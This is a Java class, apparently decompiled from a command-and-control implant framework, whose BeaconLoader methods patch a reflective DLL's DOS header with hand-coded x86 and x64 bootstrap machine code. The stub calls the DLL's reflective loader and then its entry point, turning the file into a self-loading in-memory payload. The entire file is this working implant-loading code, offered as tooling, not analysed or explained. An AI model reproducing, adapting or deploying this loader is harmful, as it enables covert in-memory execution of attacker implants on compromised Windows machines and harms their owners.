package pe;

import common.CommonUtils;
import common.Packer;
import common.ReflectiveDLL;

public class BeaconLoader {
   public static byte[] patchDOSHeader(byte[] var0) {
      return patchDOSHeader(var0, 1453503984);
   }

   public static byte[] patchDOSHeader(byte[] var0, int var1) {
      int var2 = ReflectiveDLL.findReflectiveLoader(var0);
      if (ReflectiveDLL.is64(var0)) {
         throw new RuntimeException("x64 DLL passed to x86 patch function");
      } else if (var2 < 0) {
         return new byte[0];
      } else {
         Packer var3 = new Packer();
         var3.little();
         var3.addByte(77);
         var3.addByte(90);
         var3.addByte(232);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(91);
         var3.addByte(137);
         var3.addByte(223);
         var3.addByte(82);
         var3.addByte(69);
         var3.addByte(85);
         var3.addByte(137);
         var3.addByte(229);
         var3.addByte(129);
         var3.addByte(195);
         var3.addInt(var2 - 7);
         var3.addByte(255);
         var3.addByte(211);
         var3.addByte(104);
         var3.addInt(var1);
         var3.addByte(104);
         var3.addByte(4);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(87);
         var3.addByte(255);
         var3.addByte(208);
         byte[] var4 = var3.getBytes();
         if (var4.length > 62) {
            CommonUtils.print_error("bootstrap length is: " + var4.length + " (it's too big!)");
            return new byte[0];
         } else {
            for(int var5 = 0; var5 < var4.length; ++var5) {
               var0[var5] = var4[var5];
            }

            return var0;
         }
      }
   }

   public static byte[] patchDOSHeaderX64(byte[] var0) {
      return patchDOSHeaderX64(var0, 1453503984);
   }

   public static byte[] patchDOSHeaderX64(byte[] var0, int var1) {
      int var2 = ReflectiveDLL.findReflectiveLoader(var0);
      if (!ReflectiveDLL.is64(var0)) {
         throw new RuntimeException("x86 DLL passed to x64 patch function");
      } else if (var2 < 0) {
         return new byte[0];
      } else {
         Packer var3 = new Packer();
         var3.little();
         var3.addByte(77);
         var3.addByte(90);
         var3.addByte(65);
         var3.addByte(82);
         var3.addByte(85);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(229);
         var3.addByte(72);
         var3.addByte(129);
         var3.addByte(236);
         var3.addByte(32);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(72);
         var3.addByte(141);
         var3.addByte(29);
         var3.addByte(234);
         var3.addByte(255);
         var3.addByte(255);
         var3.addByte(255);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(223);
         var3.addByte(72);
         var3.addByte(129);
         var3.addByte(195);
         var3.addInt(var2);
         var3.addByte(255);
         var3.addByte(211);
         var3.addByte(65);
         var3.addByte(184);
         var3.addInt(var1);
         var3.addByte(104);
         var3.addByte(4);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(90);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(249);
         var3.addByte(255);
         var3.addByte(208);
         byte[] var4 = var3.getBytes();
         if (var4.length > 62) {
            CommonUtils.print_error("bootstrap length is: " + var4.length + " (it's too big!)");
            return new byte[0];
         } else {
            for(int var5 = 0; var5 < var4.length; ++var5) {
               var0[var5] = var4[var5];
            }

            return var0;
         }
      }
   }
}
